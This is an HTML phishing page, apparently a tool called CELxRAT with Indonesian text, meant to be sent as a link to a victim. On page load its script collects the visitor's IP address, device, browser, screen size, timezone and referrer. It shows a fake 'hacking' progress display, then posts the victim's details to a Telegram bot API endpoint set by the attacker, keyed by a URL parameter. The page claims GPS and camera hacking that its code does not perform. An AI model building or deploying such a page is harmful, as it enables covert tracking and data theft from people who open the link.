<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CELxRAT • PHISING MODE</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            position: relative;
        }
        
        /* Snow Animation - Full */
        .snow {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            pointer-events: none;
            z-index: 1;
        }
        
        .snowflake {
            position: absolute;
            color: #fff;
            font-size: 1.5em;
            opacity: 0.8;
            animation: fall linear infinite;
            text-shadow: 0 0 10px #00ff9d;
        }
        
        @keyframes fall {
            to { transform: translateY(100vh); }
        }
        
        /* Container Utama */
        .container {
            background: rgba(0, 20, 10, 0.95);
            border: 2px solid #00ff9d;
            border-radius: 20px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            position: relative;
            z-index: 2;
            box-shadow: 0 0 50px #00ff9d;
            animation: glow 2s ease-in-out infinite;
        }
        
        @keyframes glow {
            0%, 100% { box-shadow: 0 0 30px #00ff9d; }
            50% { box-shadow: 0 0 70px #00ff9d; }
        }
        
        /* Header */
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        h1 {
            color: #00ff9d;
            font-size: 2.5em;
            text-transform: uppercase;
            text-shadow: 0 0 10px #00ff9d;
            animation: glitch 1s infinite;
            position: relative;
        }
        
        h1::before, h1::after {
            content: 'CELxRAT';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.8;
        }
        
        h1::before {
            color: #ff00ff;
            z-index: -1;
            animation: glitch-offset 0.3s infinite linear;
        }
        
        h1::after {
            color: #00ffff;
            z-index: -2;
            animation: glitch-offset 0.2s infinite linear reverse;
        }
        
        @keyframes glitch-offset {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        
        /* Badge Info */
        .info-badge {
            background: #00ff9d;
            color: #000;
            padding: 8px 20px;
            border-radius: 30px;
            display: inline-block;
            margin: 15px 0;
            font-weight: bold;
            font-size: 1.2em;
            text-transform: uppercase;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        /* Progress Bar */
        .progress-container {
            margin: 30px 0;
        }
        
        .progress-bar {
            width: 100%;
            height: 30px;
            background: rgba(0, 255, 157, 0.2);
            border: 1px solid #00ff9d;
            border-radius: 15px;
            overflow: hidden;
            position: relative;
        }
        
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00ff9d, #00cc7a);
            border-radius: 15px;
            transition: width 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .progress-fill::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            animation: shimmer 1.5s infinite;
        }
        
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        
        .progress-text {
            text-align: center;
            margin-top: 10px;
            color: #00ff9d;
            font-size: 1.2em;
            font-weight: bold;
        }
        
        /* Status Messages */
        .status {
            color: #00ff9d;
            margin: 20px 0;
            padding: 10px;
            border-left: 3px solid #00ff9d;
            background: rgba(0, 255, 157, 0.1);
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        /* Info Box */
        .info-box {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff9d;
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
        }
        
        .info-row {
            display: flex;
            justify-content: space-between;
            margin: 10px 0;
            color: #00ff9d;
            border-bottom: 1px dashed rgba(0, 255, 157, 0.3);
            padding-bottom: 5px;
        }
        
        .info-label {
            color: #888;
        }
        
        .info-value {
            font-weight: bold;
            color: #00ff9d;
        }
        
        /* Terminal Style */
        .terminal {
            background: #000;
            border: 1px solid #00ff9d;
            border-radius: 10px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            margin-top: 20px;
        }
        
        .terminal-header {
            display: flex;
            justify-content: space-between;
            color: #00ff9d;
            margin-bottom: 10px;
            padding-bottom: 5px;
            border-bottom: 1px solid #00ff9d;
        }
        
        .terminal-content {
            color: #00ff9d;
            font-size: 0.9em;
            max-height: 150px;
            overflow-y: auto;
        }
        
        .terminal-content div {
            margin: 5px 0;
            animation: fadeIn 0.5s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateX(-10px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        /* Loading Dots */
        .loading-dots::after {
            content: '.';
            animation: dots 1.5s infinite;
        }
        
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
        
        /* Hidden Iframe */
        #dataSender {
            display: none;
        }
        
        /* Responsive */
        @media (max-width: 600px) {
            .container {
                padding: 20px;
                width: 95%;
            }
            
            h1 {
                font-size: 2em;
            }
        }
    </style>
</head>
<body>
    <!-- Snow Animation Container -->
    <div class="snow" id="snowContainer"></div>
    
    <!-- Main Container -->
    <div class="container">
        <div class="header">
            <h1>CELxRAT</h1>
            <div class="info-badge" id="hackTypeBadge">LOADING...</div>
        </div>
        
        <!-- Info Box (Data dari URL) -->
        <div class="info-box">
            <div class="info-row">
                <span class="info-label">TARGET ID :</span>
                <span class="info-value" id="targetId">-</span>
            </div>
            <div class="info-row">
                <span class="info-label">OPERASI :</span>
                <span class="info-value" id="operationType">-</span>
            </div>
            <div class="info-row">
                <span class="info-label">DURASI :</span>
                <span class="info-value" id="duration">-</span>
            </div>
            <div class="info-row">
                <span class="info-label">IP ADDRESS :</span>
                <span class="info-value" id="ipAddress">MENGUMPULKAN...</span>
            </div>
            <div class="info-row">
                <span class="info-label">DEVICE :</span>
                <span class="info-value" id="device">-</span>
            </div>
        </div>
        
        <!-- Progress Bar -->
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-text" id="progressText">0%</div>
        </div>
        
        <!-- Status Message -->
        <div class="status" id="statusMessage">
            INITIALIZING SYSTEM<span class="loading-dots"></span>
        </div>
        
        <!-- Terminal Log -->
        <div class="terminal">
            <div class="terminal-header">
                <span>SYSTEM LOG</span>
                <span>● CELxRAT V1.0</span>
            </div>
            <div class="terminal-content" id="terminalLog">
                <div>> SYSTEM AKTIF</div>
                <div>> MENUNGGU KONEKSI...</div>
            </div>
        </div>
    </div>
    
    <!-- Hidden iframe untuk kirim data -->
    <iframe id="dataSender" name="dataSender" style="display:none;"></iframe>
    
    <script>
        // Generate Snowflakes
        function createSnow() {
            const snowContainer = document.getElementById('snowContainer');
            for (let i = 0; i < 100; i++) {
                const snowflake = document.createElement('div');
                snowflake.className = 'snowflake';
                snowflake.innerHTML = '❄️';
                snowflake.style.left = Math.random() * 100 + '%';
                snowflake.style.animationDuration = Math.random() * 5 + 3 + 's';
                snowflake.style.fontSize = Math.random() * 20 + 10 + 'px';
                snowflake.style.opacity = Math.random() * 0.7 + 0.3;
                snowflake.style.animationDelay = Math.random() * 5 + 's';
                snowContainer.appendChild(snowflake);
            }
        }
        
        // Get URL Parameters
        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                type: params.get('type') || 'unknown',
                id: params.get('id') || 'unknown',
                duration: params.get('duration') || '5',
                timestamp: Date.now()
            };
        }
        
        // Get Device Info
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Desktop';
            let browser = 'Unknown';
            
            if (ua.match(/Android/i)) device = 'Android';
            else if (ua.match(/iPhone|iPad|iPod/i)) device = 'iOS';
            else if (ua.match(/Windows Phone/i)) device = 'Windows Phone';
            
            if (ua.match(/Chrome/i)) browser = 'Chrome';
            else if (ua.match(/Firefox/i)) browser = 'Firefox';
            else if (ua.match(/Safari/i)) browser = 'Safari';
            else if (ua.match(/Edge/i)) browser = 'Edge';
            
            return `${device} (${browser})`;
        }
        
        // Get IP (via API)
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
        
        // Update UI berdasarkan type
        function updateUIByType(type, duration) {
            const badge = document.getElementById('hackTypeBadge');
            const operationEl = document.getElementById('operationType');
            const durationEl = document.getElementById('duration');
            
            let operationText = '';
            let badgeText = '';
            
            switch(type) {
                case 'location':
                    operationText = 'LACAK LOKASI';
                    badgeText = '📍 GPS TRACKING';
                    break;
                case 'camera':
                    operationText = 'HACK KAMERA';
                    badgeText = '📸 CAMERA HACK';
                    break;
                case 'video':
                    operationText = 'REKAM VIDEO';
                    badgeText = '🎥 VIDEO CAPTURE';
                    break;
                default:
                    operationText = 'DATA COLLECTION';
                    badgeText = '👁️ SYSTEM ACCESS';
            }
            
            badge.textContent = badgeText;
            operationEl.textContent = operationText;
            durationEl.textContent = type === 'video' ? duration + ' detik' : 'Instant';
        }
        
        // Add terminal log
        function addTerminalLog(message) {
            const terminal = document.getElementById('terminalLog');
            const logEntry = document.createElement('div');
            logEntry.innerHTML = `> ${message}`;
            terminal.appendChild(logEntry);
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        // Kirim data ke bot
        function sendDataToBot(data) {
            // Format data yang dikirim
            const capturedData = {
                type: data.type,
                userId: data.id,
                duration: data.duration,
                timestamp: data.timestamp,
                ip: data.ip,
                device: data.device,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenSize: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'Direct'
            };
            
            // Kirim ke bot Telegram via API (simulasi)
            // Di sini lo bisa ganti dengan webhook bot lo
            console.log('DATA TERKIRIM:', capturedData);
            
            // Trigger notifikasi ke bot (lo bisa implementasi sendiri)
            // Contoh pake fetch ke API bot lo
            fetch('https://api.telegram.org/botTOKEN_LO/sendMessage', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: data.id,
                    text: `✅ HACK BERHASIL!\nType: ${data.type}\nIP: ${data.ip}\nDevice: ${data.device}\nWaktu: ${new Date().toLocaleString()}`,
                    parse_mode: 'HTML'
                })
            }).catch(e => console.log('Bot send error:', e));
            
            // Simpan ke localStorage buat history
            let history = JSON.parse(localStorage.getItem('hackHistory') || '[]');
            history.push(capturedData);
            localStorage.setItem('hackHistory', JSON.stringify(history.slice(-10)));
        }
        
        // Main function
        async function main() {
            // Create snow
            createSnow();
            
            // Get params
            const params = getUrlParams();
            const device = getDeviceInfo();
            const ip = await getIP();
            
            // Update UI
            document.getElementById('targetId').textContent = params.id;
            document.getElementById('device').textContent = device;
            document.getElementById('ipAddress').textContent = ip;
            
            updateUIByType(params.type, params.duration);
            
            // Add terminal logs
            addTerminalLog(`Target ID: ${params.id}`);
            addTerminalLog(`Operation: ${params.type}`);
            addTerminalLog(`Device: ${device}`);
            addTerminalLog(`IP: ${ip}`);
            addTerminalLog(`Timestamp: ${new Date().toLocaleString()}`);
            addTerminalLog('Membangun koneksi aman...');
            
            // Progress bar animation
            let progress = 0;
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            const statusMsg = document.getElementById('statusMessage');
            
            const messages = [
                'Mengakses sistem target...',
                'Melewati firewall...',
                'Membobol enkripsi...',
                'Mengambil data...',
                'Menganalisis...',
                'Hampir selesai...'
            ];
            
            const interval = setInterval(() => {
                progress += Math.random() * 3 + 1;
                
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                    
                    progressFill.style.width = progress + '%';
                    progressText.textContent = progress + '%';
                    statusMsg.innerHTML = '✅ AKSES DITERIMA!';
                    
                    // Kirim data
                    sendDataToBot({
                        ...params,
                        ip: ip,
                        device: device
                    });
                    
                    addTerminalLog('✓ DATA BERHASIL DIAMBIL!');
                    addTerminalLog('✓ MENGIRIM KE SERVER...');
                    addTerminalLog('✓ SELESAI!');
                    
                } else {
                    progressFill.style.width = progress + '%';
                    progressText.textContent = Math.floor(progress) + '%';
                    
                    // Update status message
                    const msgIndex = Math.floor((progress / 100) * messages.length);
                    statusMsg.innerHTML = messages[Math.min(msgIndex, messages.length - 1)] + '<span class="loading-dots"></span>';
                    
                    // Add random terminal logs
                    if (Math.random() > 0.7) {
                        const logs = [
                            'Mengecek port terbuka...',
                            'Menganalisis keamanan...',
                            'Mendapatkan akses root...',
                            'Membypass 2FA...',
                            'Mengumpulkan data sensor...',
                            'Mengakses database...'
                        ];
                        addTerminalLog(logs[Math.floor(Math.random() * logs.length)]);
                    }
                }
            }, 200);
            
            // Store data untuk referensi
            window.hackData = {
                ...params,
                ip,
                device,
                timestamp: Date.now()
            };
        }
        
        // Run when page loads
        window.onload = main;
    </script>
</body>
</html>
